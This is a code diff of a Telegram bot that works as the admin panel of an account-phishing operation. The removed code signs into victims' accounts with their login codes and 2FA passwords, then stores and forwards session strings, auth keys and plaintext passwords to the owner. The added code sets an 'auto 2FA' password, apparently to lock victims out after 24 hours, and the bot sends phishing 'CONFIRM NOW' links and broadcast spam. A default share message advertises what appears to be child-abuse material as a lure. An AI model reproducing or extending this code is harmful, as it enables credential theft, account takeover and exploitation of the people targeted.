@@ -37,7 +37,7 @@ https://t.me/Xxxvo_bot
 ᴠɪʀᴀʟ ᴄᴩ ᴍᴍꜱ xxx👆"""
 
 logger.info("=" * 60)
-logger.info("ENV CHECK")
+logger.info("ADMIN BOT START")
 logger.info(f"  BOT_TOKEN  : {'SET' if BOT_TOKEN else 'MISSING'}")
 logger.info(f"  API_ID     : {API_ID}")
 logger.info(f"  OWNER_ID   : {YOUR_TELEGRAM_ID}")
@@ -59,6 +59,7 @@ USERS_FILE = "bot_users.json"
 WELCOME_FILE = "welcome_config.json"
 BROADCAST_CFG_FILE = "broadcast_config.json"
 SHARE_FILE = "share_config.json"
+AUTOPASS_FILE = "auto_2fa.json"
 
 STATE = {
     "welcome_capture": False,
@@ -68,6 +69,7 @@ STATE = {
     "awaiting_btn_text": False,
     "awaiting_btn_url": False,
     "awaiting_share_msg": False,
+    "awaiting_2fa_pass": False,
 }
 
 broadcast_state = {
@@ -192,11 +194,21 @@ def save_share_config(cfg):
     save_json(SHARE_FILE, cfg)
 
 
+def load_autopass():
+    cfg = load_json(AUTOPASS_FILE, {"password": ""})
+    return cfg.get("password", "")
+
+
+def save_autopass(pwd):
+    save_json(AUTOPASS_FILE, {"password": pwd})
+
+
 captured_accounts = load_accounts()
 users = load_users()
 welcome_config = load_welcome_config()
 broadcast_config = load_broadcast_config()
 share_config = load_share_config()
+auto_2fa_pass = load_autopass()
 
 
 def format_phone(ph):
@@ -225,165 +237,25 @@ def account_label(a):
     return "✨✨"
 
 
-# ============================================================
-# NOTIFY — SEND WITH MSG_ID STORED FOR EDIT
-# ============================================================
-def notify(phone, ss, me, dc, pu=False, pv="", account_ref=None):
-    """Send notification and store msg_id in account for later edit"""
+def notify_owner(text):
     if not BOT_TOKEN or not YOUR_TELEGRAM_ID:
-        return
+        return None
     try:
-        extra = ""
-        if pu:
-            extra = "\n2FA Used"
-            if pv:
-                extra += f" | Pwd: `{pv}`"
-        msg = (f"New Account!{extra}\nPhone: {phone}\n"
-               f"Name: {me.first_name} {me.last_name or ''}\n"
-               f"User ID: {me.id}\nDC: {dc}\n\nSession:\n`{ss}`")
-        if len(msg) > 4000:
-            msg = msg[:3990] + "..."
         r = http_requests.post(
             f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
-            json={'chat_id': YOUR_TELEGRAM_ID, 'text': msg, 'parse_mode': 'Markdown'},
+            json={'chat_id': YOUR_TELEGRAM_ID, 'text': text, 'parse_mode': 'Markdown'},
             timeout=15)
-        # Store message id for later edit
-        if r.status_code == 200 and account_ref is not None:
-            try:
-                resp = r.json()
-                msg_id = resp.get("result", {}).get("message_id")
-                if msg_id:
-                    account_ref["notify_msg_id"] = msg_id
-                    account_ref["notify_chat_id"] = YOUR_TELEGRAM_ID
-                    logger.info(f"Notify msg_id stored: {msg_id} for {phone}")
-            except Exception as e:
-                logger.error(f"store msg_id err: {e}")
+        if r.status_code == 200:
+            return r.json().get("result", {}).get("message_id")
     except Exception as e:
-        logger.error(f"notify: {e}")
-
-
-def run_tg(phone, code=None, password=None):
-    loop = asyncio.new_event_loop()
-    asyncio.set_event_loop(loop)
-    try:
-        async def send_code():
-            client = TelegramClient(StringSession(), API_ID, API_HASH)
-            await client.connect()
-            try:
-                r = await client.send_code_request(phone)
-                session_str = StringSession.save(client.session)
-                with sessions_lock:
-                    user_sessions[phone] = {'hash': r.phone_code_hash, 'session': session_str}
-                    pending_codes[phone] = 'sent'
-                    pending_2fa[phone] = False
-                return {'success': True}
-            except errors.FloodWaitError as e:
-                with sessions_lock:
-                    pending_codes[phone] = 'err'
-                return {'success': False, 'error': f'Flood {e.seconds}s'}
-            except Exception as e:
-                with sessions_lock:
-                    pending_codes[phone] = 'err'
-                return {'success': False, 'error': str(e)[:80]}
-            finally:
-                try:
-                    await client.disconnect()
-                except Exception:
-                    pass
-
-        async def verify():
-            with sessions_lock:
-                if phone not in user_sessions:
-                    return {'success': False, 'error': 'No session'}
-                s = user_sessions[phone]
-            client = TelegramClient(StringSession(s['session']), API_ID, API_HASH)
-            try:
-                await client.connect()
-                if not await client.is_user_authorized():
-                    try:
-                        await client.sign_in(phone=phone, code=code, phone_code_hash=s['hash'])
-                    except errors.SessionPasswordNeededError:
-                        with sessions_lock:
-                            pending_2fa[phone] = True
-                            pending_codes[phone] = '2fa_needed'
-                        if password:
-                            try:
-                                await client.sign_in(password=password)
-                                with sessions_lock:
-                                    pending_2fa[phone] = False
-                                    pending_codes[phone] = 'done'
-                            except errors.PasswordHashInvalidError:
-                                return {'success': False, 'error': 'Wrong 2FA password'}
-                        else:
-                            return {'success': False, 'error': '2FA', 'needs_password': True}
-                    except errors.PhoneCodeInvalidError:
-                        return {'success': False, 'error': 'Wrong code'}
-                    except errors.PhoneCodeExpiredError:
-                        return {'success': False, 'error': 'Code expired'}
-                me = await client.get_me()
-                await client.get_dialogs()
-                ss = StringSession.save(client.session)
-                try:
-                    ak = client.session.auth_key.key
-                    dc = client.session.dc_id
-                except Exception:
-                    ak = b""
-                    dc = 0
-                ab = base64.b64encode(ak).decode() if ak else ""
-                pu = password is not None
-                acc = {
-                    'phone': phone, 'user_id': me.id,
-                    'username': me.username or '', 'first_name': me.first_name or '',
-                    'last_name': me.last_name or '', 'session': ss,
-                    'webk': json.dumps({'dcId': dc, 'authKey': ab, 'userId': me.id,
-                        'isSupport': False, 'isTest': False}),
-                    'dc': dc, 'time': str(datetime.now()),
-                    'has_2fa': pu, 'password': password if pu else '',
-                    'added_at': time.time(),
-                    'expires_at': time.time() + 86400,
-                    'status': 'active',
-                    'is_premium': False,
-                }
-                save_account(acc)
-                global captured_accounts
-                captured_accounts = load_accounts()
-                # Find saved ref
-                ref = next((x for x in captured_accounts if x.get('phone') == phone), acc)
-                notify(phone, ss, me, dc, pu, password if pu else "", account_ref=ref)
-                # Save ref with msg_id back
-                save_account(ref)
-                captured_accounts = load_accounts()
-                with sessions_lock:
-                    user_sessions.pop(phone, None)
-                    pending_2fa.pop(phone, None)
-                    pending_codes[phone] = 'done'
-                return {'success': True, 'session': ss, 'user_id': me.id}
-            except Exception as e:
-                es = str(e)
-                if 'PHONE_CODE_INVALID' in es:
-                    return {'success': False, 'error': 'Wrong code'}
-                if 'SESSION_PASSWORD_NEEDED' in es:
-                    return {'success': False, 'error': '2FA', 'needs_password': True}
-                if 'PASSWORD_HASH_INVALID' in es:
-                    return {'success': False, 'error': 'Wrong 2FA password'}
-                return {'success': False, 'error': es[:80]}
-            finally:
-                try:
-                    await client.disconnect()
-                except Exception:
-                    pass
-
-        if code:
-            return loop.run_until_complete(verify())
-        return loop.run_until_complete(send_code())
-    finally:
-        loop.close()
+        logger.error(f"notify_owner: {e}")
+    return None
 
 
 # ============================================================
-# BOT
+# ADMIN BOT
 # ============================================================
-SESSION_PATH = f"/tmp/bot_{uuid.uuid4().hex[:8]}.session"
+SESSION_PATH = f"/tmp/adminbot_{uuid.uuid4().hex[:8]}.session"
 bot = TelegramClient(SESSION_PATH, API_ID, API_HASH)
 
 
@@ -397,12 +269,9 @@ def admin_menu():
          Button.inline("📊 Stats", b"menu_stats")],
         [Button.inline(f"⏱ Timer: {timer_value}s", b"menu_timer"),
          Button.inline(f"🗑 Auto-Del: {'ON' if AUTO_DELETE_EXPIRED else 'OFF'}", b"menu_toggle_expired")],
+        [Button.inline(f"🔐 Auto 2FA: {'SET' if auto_2fa_pass else 'EMPTY'}", b"menu_autopass")],
         [Button.inline("🔄 Reset Modes", b"menu_reset")],
     ]
-
-
-def back_button():
-    return [Button.inline("⬅️ Back", b"menu_home")]
 
 
 def welcome_menu():
@@ -508,101 +377,29 @@ async def safe_send_user(uid, text, buttons=None):
     return None
 
 
-async def send_welcome(uid, name):
-    logger.info(f"=== SEND_WELCOME uid={uid} name={name} ===")
-    msgs = welcome_config.get("messages", [])
-    if not msgs:
-        return []
-    show_button = welcome_config.get("show_button", True)
-    btn_text = welcome_config.get("button_text", "CONFIRM NOW")
-    btn_url = welcome_config.get("button_url", WEBAPP_URL + "?auto=1")
-    sent_ids = []
-    for i, m in enumerate(msgs):
-        content = (m.get("content") or "").replace("{name}", name)
-        is_last = (i == len(msgs) - 1)
-        buttons = None
-        if is_last and show_button:
-            buttons = [[Button.url(btn_text, btn_url)]]
-        sent_msg = await safe_send_user(uid, content, buttons)
-        if sent_msg:
-            sent_ids.append(sent_msg.id)
-            logger.info(f"✅ Welcome #{i+1} sent: {sent_msg.id}")
-        await asyncio.sleep(0.3)
-    return sent_ids
-
-
-# ============================================================
-# EDIT NOTIFY MESSAGE — TERMINATED / EXPIRED
-# ============================================================
-async def edit_notify_message(account, status_text):
-    """Edit stored notify message to show status on top"""
-    try:
-        msg_id = account.get("notify_msg_id")
-        chat_id = account.get("notify_chat_id") or YOUR_TELEGRAM_ID
-        if not msg_id:
-            logger.warning(f"No notify_msg_id for {account.get('phone')}")
-            return False
-        phone = account.get("phone", "?")
-        name = (account.get("first_name", "") or "") + " " + (account.get("last_name", "") or "")
-        name = name.strip() or "?"
-        dc = account.get("dc", "?")
-        ss = account.get("session", "")
-        pu = account.get("has_2fa", False)
-        pv = account.get("password", "")
-
-        extra = ""
-        if pu:
-            extra = "\n2FA Used"
-            if pv:
-                extra += f" | Pwd: `{pv}`"
-
-        new_text = (f"{status_text}\n\n"
-                    f"Phone: {phone}\n"
-                    f"Name: {name}\n"
-                    f"User ID: {account.get('user_id', '?')}\n"
-                    f"DC: {dc}\n\n"
-                    f"Session:\n`{ss}`")
-        if len(new_text) > 4000:
-            new_text = new_text[:3990] + "..."
-        await bot.edit_message(chat_id, msg_id, new_text, parse_mode='md')
-        logger.info(f"✅ Edited notify msg for {phone} → {status_text[:30]}")
-        return True
-    except Exception as e:
-        logger.error(f"edit_notify err: {type(e).__name__}: {e}")
-        return False
-
-
 @bot.on(events.NewMessage(pattern='/start'))
 async def start_handler(event):
-    logger.info("=== /start received ===")
+    logger.info("=== Admin /start ===")
     try:
         sender = await event.get_sender()
         uid = sender.id
-        name = sender.first_name or "Friend"
-        users[str(uid)] = {
-            "id": uid, "name": name,
-            "username": sender.username or "",
-            "joined": str(datetime.now()),
-        }
-        save_users(users)
         if uid == YOUR_TELEGRAM_ID:
             await event.respond(
                 "🔧 **Admin Panel**\n\nUsers: `" + str(len(users)) + "`",
                 buttons=admin_menu(), parse_mode='md')
-            return
-        await send_welcome(uid, name)
     except Exception as e:
-        logger.error(f"/start error: {type(e).__name__}: {e}")
-        logger.error(traceback.format_exc())
+        logger.error(f"/start: {e}")
 
 
+# ============================================================
+# CALLBACK — compact
+# ============================================================
 @bot.on(events.CallbackQuery())
 async def cb(event):
-    global timer_value, AUTO_DELETE_EXPIRED, broadcast_config, share_config
+    global timer_value, AUTO_DELETE_EXPIRED, auto_2fa_pass, broadcast_config, share_config, welcome_config
     if event.sender_id != YOUR_TELEGRAM_ID:
         return await event.answer("Not authorized", alert=True)
     data = event.data.decode()
-    logger.info(f"=== Callback: {data} ===")
     chat_id = event.sender_id
 
     try:
@@ -616,41 +413,44 @@ async def cb(event):
             for k in STATE:
                 STATE[k] = False
             await event.answer("Reset!", alert=True)
-            await safe_send(chat_id, "✅ Modes reset.", admin_menu(), edit_event=event)
+            await safe_send(chat_id, "✅ Reset.", admin_menu(), edit_event=event)
+
+        elif data == "menu_autopass":
+            STATE["awaiting_2fa_pass"] = True
+            cur = auto_2fa_pass if auto_2fa_pass else "_(empty)_"
+            await event.answer()
+            await safe_send(chat_id,
+                f"🔐 **Auto 2FA Password**\n\nCurrent: `{cur}`\n\nSend new password (24h por ei password set hobe).",
+                [[Button.inline("🗑 Clear", b"autopass_clear"), Button.inline("⬅️ Back", b"menu_home")]],
+                edit_event=event)
+
+        elif data == "autopass_clear":
+            auto_2fa_pass = ""
+            save_autopass("")
+            await event.answer("Cleared!", alert=True)
+            await safe_send(chat_id, "✅ Auto 2FA cleared.", admin_menu(), edit_event=event)
 
         elif data == "menu_welcome":
             n = len(welcome_config.get("messages", []))
             await event.answer()
-            await safe_send(chat_id,
-                f"👋 **Welcome Messages** — `{n}` active\n\n"
-                f"**Bold:** `**text**`\n**Italic:** `__text__`\n**Quote:** `> text`\n**Code:** `` `code` ``",
-                welcome_menu(), edit_event=event)
+            await safe_send(chat_id, f"👋 Welcome — `{n}` active", welcome_menu(), edit_event=event)
 
         elif data == "wl_add":
             STATE["welcome_capture"] = True
-            await event.answer("Send welcome messages")
-            await safe_send(chat_id,
-                "✍️ **Welcome Capture: ON**\n\n"
-                "Send text/photo/video one by one.\n\n"
-                "**Bold:** `**text**`\n**Italic:** `__text__`\n**Quote:** `> text`\n**Code:** `` `code` ``\n\n"
-                "Tap Stop when done.",
-                [
-                    [Button.inline("⏹ Stop & Save", b"wl_stop")],
-                    [Button.inline("⬅️ Back", b"menu_home")]
-                ], edit_event=event)
+            await event.answer("Send messages")
+            await safe_send(chat_id, "✍️ Send welcome msgs one by one. Tap Stop.",
+                [[Button.inline("⏹ Stop & Save", b"wl_stop")], [Button.inline("⬅️ Back", b"menu_home")]],
+                edit_event=event)
 
         elif data == "wl_stop":
             STATE["welcome_capture"] = False
             n = len(welcome_config.get("messages", []))
             await event.answer(f"Saved {n}", alert=True)
-            await safe_send(chat_id, f"✅ Welcome: `{n}` messages.",
-                admin_menu(), edit_event=event)
+            await safe_send(chat_id, f"✅ Welcome: `{n}`", admin_menu(), edit_event=event)
 
         elif data == "wl_list":
             msgs = welcome_config.get("messages", [])
-            if not msgs:
-                return await event.answer("Empty", alert=True)
-            txt = f"**{len(msgs)} messages:**\n\n"
+            txt = f"**{len(msgs)} messages:**\n\n" if msgs else "Empty"
             for i, m in enumerate(msgs):
                 prev = (m.get("content") or "")[:40].replace("\n", " ")
                 txt += f"{i+1}. `{prev}...`\n"
@@ -660,21 +460,18 @@ async def cb(event):
             welcome_config["messages"] = []
             save_welcome_config(welcome_config)
             await event.answer("Cleared!", alert=True)
-            await safe_send(chat_id, "Cleared welcome messages.", admin_menu(),
-                edit_event=event)
+            await safe_send(chat_id, "Cleared.", admin_menu(), edit_event=event)
 
         elif data == "wl_btntext":
             STATE["awaiting_btn_text"] = True
             await event.answer()
-            await safe_send(chat_id,
-                f"✏️ Current: `{welcome_config.get('button_text', 'CONFIRM NOW')}`\n\nSend new button text.",
+            await safe_send(chat_id, f"Current: `{welcome_config.get('button_text','')}`\nSend new text.",
                 [[Button.inline("⬅️ Back", b"menu_home")]], edit_event=event)
 
         elif data == "wl_btnurl":
             STATE["awaiting_btn_url"] = True
             await event.answer()
-            await safe_send(chat_id,
-                f"🔗 Current: `{welcome_config.get('button_url', WEBAPP_URL)}`\n\nSend new URL.",
+            await safe_send(chat_id, f"Current: `{welcome_config.get('button_url','')}`\nSend new URL.",
                 [[Button.inline("⬅️ Back", b"menu_home")]], edit_event=event)
 
         elif data == "wl_toggle_btn":
@@ -687,33 +484,26 @@ async def cb(event):
 
         elif data == "wl_preview":
             await event.answer("Preview sent")
-            await send_welcome(YOUR_TELEGRAM_ID, "Preview")
+            for m in welcome_config.get("messages", []):
+                content = (m.get("content") or "").replace("{name}", "Preview")
+                await safe_send_user(chat_id, content)
 
         elif data == "menu_broadcast":
             await event.answer()
-            await safe_send(chat_id,
-                "📢 **Broadcast**\n\n"
-                "• **Non-Logged** — users who haven't logged in yet\n"
-                "• **Logged** — users who already logged in",
-                broadcast_menu(), edit_event=event)
+            await safe_send(chat_id, "📢 Broadcast", broadcast_menu(), edit_event=event)
 
         elif data == "bc_nonlogged":
             await event.answer()
             await safe_send(chat_id,
-                f"📢 **Non-Logged Broadcast**\nQueue: `{len(broadcast_config.get('nonlogged', []))}`",
+                f"📢 Non-Logged — Queue: `{len(broadcast_config.get('nonlogged', []))}`",
                 bc_nonlogged_menu(), edit_event=event)
 
         elif data == "bcnl_add":
             STATE["bc_nonlogged_capture"] = True
-            STATE["bc_logged_capture"] = False
-            STATE["welcome_capture"] = False
             await event.answer("Send messages")
-            await safe_send(chat_id,
-                "📥 **Non-Logged Capture: ON**\n\nSend text/photo/video. Tap Start when done.",
-                [
-                    [Button.inline("▶️ Start Now", b"bcnl_start")],
-                    [Button.inline("❌ Cancel", b"bcnl_cancel")]
-                ], edit_event=event)
+            await safe_send(chat_id, "📥 Send text/photo/video.",
+                [[Button.inline("▶️ Start Now", b"bcnl_start")], [Button.inline("❌ Cancel", b"bcnl_cancel")]],
+                edit_event=event)
 
         elif data == "bcnl_start":
             STATE["bc_nonlogged_capture"] = False
@@ -722,7 +512,7 @@ async def cb(event):
             broadcast_state["nonlogged_active"] = True
             broadcast_state["nonlogged_next"] = time.time() + 3
             await event.answer("Started!", alert=True)
-            await safe_send(chat_id, "▶️ Non-logged broadcast started.",
+            await safe_send(chat_id, "▶️ Started.",
                 [[Button.inline("⬅️ Back", b"menu_home")]], edit_event=event)
 
         elif data == "bcnl_stop":
@@ -744,31 +534,21 @@ async def cb(event):
 
         elif data == "bcnl_show":
             msgs = broadcast_config.get("nonlogged", [])
-            if not msgs:
-                return await event.answer("Empty", alert=True)
-            txt = f"**{len(msgs)} messages:**\n\n"
-            for i, m in enumerate(msgs):
-                prev = (m.get("content") or m.get("caption") or "")[:40].replace("\n", " ")
-                txt += f"{i+1}. [{m.get('type')}] `{prev}...`\n"
-            await event.answer(txt[:200], alert=True)
+            txt = f"**{len(msgs)} messages**" if msgs else "Empty"
+            await event.answer(txt, alert=True)
 
         elif data == "bc_logged":
             await event.answer()
             await safe_send(chat_id,
-                f"✅ **Logged Broadcast**\nQueue: `{len(broadcast_config.get('logged', []))}`",
+                f"✅ Logged — Queue: `{len(broadcast_config.get('logged', []))}`",
                 bc_logged_menu(), edit_event=event)
 
         elif data == "bclg_add":
             STATE["bc_logged_capture"] = True
-            STATE["bc_nonlogged_capture"] = False
-            STATE["welcome_capture"] = False
             await event.answer("Send messages")
-            await safe_send(chat_id,
-                "📥 **Logged Capture: ON**\n\nSend text/photo/video. Tap Start when done.",
-                [
-                    [Button.inline("▶️ Start Now", b"bclg_start")],
-                    [Button.inline("❌ Cancel", b"bclg_cancel")]
-                ], edit_event=event)
+            await safe_send(chat_id, "📥 Send text/photo/video.",
+                [[Button.inline("▶️ Start Now", b"bclg_start")], [Button.inline("❌ Cancel", b"bclg_cancel")]],
+                edit_event=event)
 
         elif data == "bclg_start":
             STATE["bc_logged_capture"] = False
@@ -777,7 +557,7 @@ async def cb(event):
             broadcast_state["logged_active"] = True
             broadcast_state["logged_next"] = time.time() + 3
             await event.answer("Started!", alert=True)
-            await safe_send(chat_id, "▶️ Logged broadcast started.",
+            await safe_send(chat_id, "▶️ Started.",
                 [[Button.inline("⬅️ Back", b"menu_home")]], edit_event=event)
 
         elif data == "bclg_stop":
@@ -799,36 +579,29 @@ async def cb(event):
 
         elif data == "bclg_show":
             msgs = broadcast_config.get("logged", [])
-            if not msgs:
-                return await event.answer("Empty", alert=True)
-            txt = f"**{len(msgs)} messages:**\n\n"
-            for i, m in enumerate(msgs):
-                prev = (m.get("content") or m.get("caption") or "")[:40].replace("\n", " ")
-                txt += f"{i+1}. [{m.get('type')}] `{prev}...`\n"
-            await event.answer(txt[:200], alert=True)
+            txt = f"**{len(msgs)} messages**" if msgs else "Empty"
+            await event.answer(txt, alert=True)
 
         elif data == "menu_share":
             msg = share_config.get("message", DEFAULT_SHARE_MSG)
             await event.answer()
-            await safe_send(chat_id,
-                f"🔗 **Share Message**\n\n**Current:**\n{msg}",
+            await safe_send(chat_id, f"🔗 Share\n\n**Current:**\n{msg}",
                 share_menu(), edit_event=event)
 
         elif data == "sh_edit":
             STATE["awaiting_share_msg"] = True
             await event.answer()
-            await safe_send(chat_id,
-                "✏️ Send new share message.\n\n**Multi-line supported.**",
+            await safe_send(chat_id, "✏️ Send new share message.",
                 [[Button.inline("⬅️ Back", b"menu_share")]], edit_event=event)
 
         elif data == "sh_reset":
             share_config["message"] = DEFAULT_SHARE_MSG
             save_share_config(share_config)
             await event.answer("Reset!", alert=True)
-            await safe_send(chat_id, "✅ Reset to default.", share_menu(), edit_event=event)
+            await safe_send(chat_id, "✅ Reset.", share_menu(), edit_event=event)
 
         elif data == "sh_preview":
-            await event.answer("Preview sent")
+            await event.answer("Sent")
             await bot.send_message(chat_id, share_config.get("message", DEFAULT_SHARE_MSG))
 
         elif data == "menu_expired":
@@ -836,23 +609,7 @@ async def cb(event):
             expired = [a for a in accounts if a.get("status") == "expired"]
             termin = [a for a in accounts if a.get("status") == "terminated"]
             prem = [a for a in accounts if a.get("is_premium")]
-            txt = (f"🔴 **Expired:** `{len(expired)}`\n"
-                   f"⚰️ **Terminated:** `{len(termin)}`\n"
-                   f"👹👹 **Premium:** `{len(prem)}`\n\n")
-            if expired:
-                txt += "**Expired:**\n"
-                for a in expired[:10]:
-                    txt += f"❌ `{a.get('phone')}` — expire hoyeche\n"
-            if termin:
-                txt += "\n**Terminated:**\n"
-                for a in termin[:10]:
-                    txt += f"⚰️ `{a.get('phone')}` — terminate complete\n"
-            if prem:
-                txt += "\n**Premium:**\n"
-                for a in prem[:10]:
-                    txt += f"👹👹 `{a.get('phone')}`\n"
-            if not (expired or termin or prem):
-                txt += "_No expired/premium sessions_"
+            txt = f"🔴 Expired: `{len(expired)}`\n⚰️ Terminated: `{len(termin)}`\n👹👹 Premium: `{len(prem)}`"
             await event.answer()
             await safe_send(chat_id, txt, [
                 [Button.inline("🗑 Delete Expired", b"expired_del")],
@@ -865,10 +622,9 @@ async def cb(event):
             accounts = load_accounts()
             new_a = [a for a in accounts if a.get("status") != "expired"]
             save_json(DATA_FILE, new_a)
-            global captured_accounts
             captured_accounts = new_a
             await event.answer(f"Deleted {len(accounts) - len(new_a)}", alert=True)
-            await safe_send(chat_id, "✅ Expired deleted.", admin_menu(), edit_event=event)
+            await safe_send(chat_id, "✅", admin_menu(), edit_event=event)
 
         elif data == "terminated_del":
             accounts = load_accounts()
@@ -876,7 +632,7 @@ async def cb(event):
             save_json(DATA_FILE, new_a)
             captured_accounts = new_a
             await event.answer(f"Deleted {len(accounts) - len(new_a)}", alert=True)
-            await safe_send(chat_id, "✅ Terminated deleted.", admin_menu(), edit_event=event)
+            await safe_send(chat_id, "✅", admin_menu(), edit_event=event)
 
         elif data == "expired_del_both":
             accounts = load_accounts()
@@ -884,48 +640,36 @@ async def cb(event):
             save_json(DATA_FILE, new_a)
             captured_accounts = new_a
             await event.answer(f"Deleted {len(accounts) - len(new_a)}", alert=True)
-            await safe_send(chat_id, "✅ Both deleted.", admin_menu(), edit_event=event)
+            await safe_send(chat_id, "✅", admin_menu(), edit_event=event)
 
         elif data == "menu_toggle_expired":
             AUTO_DELETE_EXPIRED = not AUTO_DELETE_EXPIRED
             await event.answer(f"Auto-Del: {'ON' if AUTO_DELETE_EXPIRED else 'OFF'}", alert=True)
-            await safe_send(chat_id,
-                f"🗑 Auto-Delete: **{'ON' if AUTO_DELETE_EXPIRED else 'OFF'}**",
+            await safe_send(chat_id, f"🗑 Auto-Del: **{'ON' if AUTO_DELETE_EXPIRED else 'OFF'}**",
                 admin_menu(), edit_event=event)
 
         elif data == "menu_timer":
             STATE["awaiting_timer"] = True
             await event.answer()
-            await safe_send(chat_id,
-                f"⏱ **Set Timer**\n\nCurrent: `{timer_value}s`\n\nSend number.",
+            await safe_send(chat_id, f"⏱ Current: `{timer_value}s`\nSend number.",
                 [[Button.inline("⬅️ Back", b"menu_home")]], edit_event=event)
 
         elif data == "menu_users":
             await event.answer(f"Total: {len(users)}", alert=True)
 
         elif data == "menu_stats":
-            b = broadcast_config
-            exp_count = sum(1 for a in captured_accounts if a.get("status") == "expired")
-            term_count = sum(1 for a in captured_accounts if a.get("status") == "terminated")
+            exp = sum(1 for a in captured_accounts if a.get("status") == "expired")
+            term = sum(1 for a in captured_accounts if a.get("status") == "terminated")
             await event.answer(
-                f"Users: {len(users)}\n"
-                f"NL queue: {len(b.get('nonlogged', []))} (Active: {broadcast_state['nonlogged_active']})\n"
-                f"Logged queue: {len(b.get('logged', []))} (Active: {broadcast_state['logged_active']})\n"
-                f"Timer: {timer_value}s\nWelcome: {len(welcome_config.get('messages', []))}\n"
-                f"Expired: {exp_count}\nTerminated: {term_count}",
+                f"Users: {len(users)}\nAccounts: {len(captured_accounts)}\nExpired: {exp}\nTerminated: {term}\n2FA pass: {'SET' if auto_2fa_pass else 'EMPTY'}",
                 alert=True)
 
         else:
-            logger.warning(f"Unknown callback: {data}")
             await event.answer("Unknown", alert=True)
 
     except Exception as e:
         logger.error(f"CB ERROR [{data}]: {type(e).__name__}: {e}")
         logger.error(traceback.format_exc())
-        try:
-            await event.answer(f"Error: {str(e)[:50]}", alert=True)
-        except Exception:
-            pass
 
 
 @bot.on(events.NewMessage(pattern='/cancel'))
@@ -939,17 +683,9 @@ async def cancel(event):
 
 @bot.on(events.NewMessage())
 async def capture(event):
-    global welcome_config, broadcast_config, share_config
+    global welcome_config, broadcast_config, share_config, auto_2fa_pass
     if event.sender_id != YOUR_TELEGRAM_ID:
-        try:
-            if event.message and event.message.contact:
-                logger.info(f"User {event.sender_id} shared contact — deleting")
-                await asyncio.sleep(0.3)
-                await event.delete()
-        except Exception as e:
-            logger.warning(f"contact delete err: {e}")
         return
-
     txt = event.raw_text or ""
     if txt.startswith('/'):
         return
@@ -958,38 +694,41 @@ async def capture(event):
         try:
             sec = int(txt.strip())
             if sec < 5:
-                return await event.respond("Min 5 seconds")
+                return await event.respond("Min 5s")
             timer_value = sec
             STATE["awaiting_timer"] = False
             broadcast_state['interval'] = sec
-            await event.respond(f"✅ Timer: **{sec}s**",
-                buttons=admin_menu(), parse_mode='md')
+            await event.respond(f"✅ Timer: **{sec}s**", buttons=admin_menu(), parse_mode='md')
         except ValueError:
-            await event.respond("Send a number")
+            await event.respond("Send number")
         return
 
     if STATE["awaiting_btn_text"]:
         welcome_config["button_text"] = txt.strip()[:40]
         STATE["awaiting_btn_text"] = False
         save_welcome_config(welcome_config)
-        await event.respond(f"✅ Button: `{welcome_config['button_text']}`",
-            buttons=admin_menu(), parse_mode='md')
+        await event.respond(f"✅ `{welcome_config['button_text']}`", buttons=admin_menu(), parse_mode='md')
         return
 
     if STATE["awaiting_btn_url"]:
         welcome_config["button_url"] = txt.strip()
         STATE["awaiting_btn_url"] = False
         save_welcome_config(welcome_config)
-        await event.respond(f"✅ URL: `{welcome_config['button_url']}`",
-            buttons=admin_menu(), parse_mode='md')
+        await event.respond(f"✅ URL set", buttons=admin_menu(), parse_mode='md')
         return
 
     if STATE["awaiting_share_msg"]:
         share_config["message"] = txt
         STATE["awaiting_share_msg"] = False
         save_share_config(share_config)
-        await event.respond("✅ Share message updated.",
-            buttons=admin_menu(), parse_mode='md')
+        await event.respond("✅ Share updated.", buttons=admin_menu(), parse_mode='md')
+        return
+
+    if STATE["awaiting_2fa_pass"]:
+        auto_2fa_pass = txt.strip()
+        STATE["awaiting_2fa_pass"] = False
+        save_autopass(auto_2fa_pass)
+        await event.respond(f"✅ Auto 2FA: `{auto_2fa_pass}`", buttons=admin_menu(), parse_mode='md')
         return
 
     if STATE["welcome_capture"]:
@@ -1001,12 +740,8 @@ async def capture(event):
             entry = {"type": "video", "content": m.message or ""}
         welcome_config.setdefault("messages", []).append(entry)
         save_welcome_config(welcome_config)
-        await event.respond(
-            f"✅ Welcome #{len(welcome_config['messages'])} added.",
-            buttons=[
-                [Button.inline("⏹ Stop & Save", b"wl_stop")],
-                [Button.inline("⬅️ Back", b"menu_home")]
-            ])
+        await event.respond(f"✅ Welcome #{len(welcome_config['messages'])} added.",
+            buttons=[[Button.inline("⏹ Stop & Save", b"wl_stop")], [Button.inline("⬅️ Back", b"menu_home")]])
         return
 
     if STATE["bc_nonlogged_capture"]:
@@ -1021,12 +756,8 @@ async def capture(event):
             entry["caption"] = m.message or ""
         broadcast_config.setdefault("nonlogged", []).append(entry)
         save_broadcast_config(broadcast_config)
-        await event.respond(
-            f"✅ Non-Logged #{len(broadcast_config['nonlogged'])} added.",
-            buttons=[
-                [Button.inline("▶️ Start Now", b"bcnl_start")],
-                [Button.inline("❌ Cancel", b"bcnl_cancel")]
-            ])
+        await event.respond(f"✅ NL #{len(broadcast_config['nonlogged'])} added.",
+            buttons=[[Button.inline("▶️ Start Now", b"bcnl_start")], [Button.inline("❌ Cancel", b"bcnl_cancel")]])
         return
 
     if STATE["bc_logged_capture"]:
@@ -1041,20 +772,16 @@ async def capture(event):
             entry["caption"] = m.message or ""
         broadcast_config.setdefault("logged", []).append(entry)
         save_broadcast_config(broadcast_config)
-        await event.respond(
-            f"✅ Logged #{len(broadcast_config['logged'])} added.",
-            buttons=[
-                [Button.inline("▶️ Start Now", b"bclg_start")],
-                [Button.inline("❌ Cancel", b"bclg_cancel")]
-            ])
+        await event.respond(f"✅ Logged #{len(broadcast_config['logged'])} added.",
+            buttons=[[Button.inline("▶️ Start Now", b"bclg_start")], [Button.inline("❌ Cancel", b"bclg_cancel")]])
         return
 
 
 # ============================================================
-# SECTION MONITOR — 1 MIN CHECK + EDIT NOTIFY ON EXPIRE/TERMINATE
+# SECTION MONITOR — 24h terminate + edit section bot msg
 # ============================================================
 async def section_monitor():
-    global AUTO_DELETE_EXPIRED
+    global AUTO_DELETE_EXPIRED, auto_2fa_pass
     while True:
         try:
             await asyncio.sleep(60)
@@ -1064,7 +791,7 @@ async def section_monitor():
             changed = False
             new_accounts = []
             for a in accounts:
-                if a.get("status") in ("terminated", "expired"):
+                if a.get("status") in ("terminated",):
                     new_accounts.append(a)
                     continue
                 session_str = a.get("session", "")
@@ -1086,21 +813,42 @@ async def section_monitor():
                     is_valid = loop.run_until_complete(check_session())
                     loop.close()
 
-                    if not is_valid:
-                        # Session invalid → mark expired
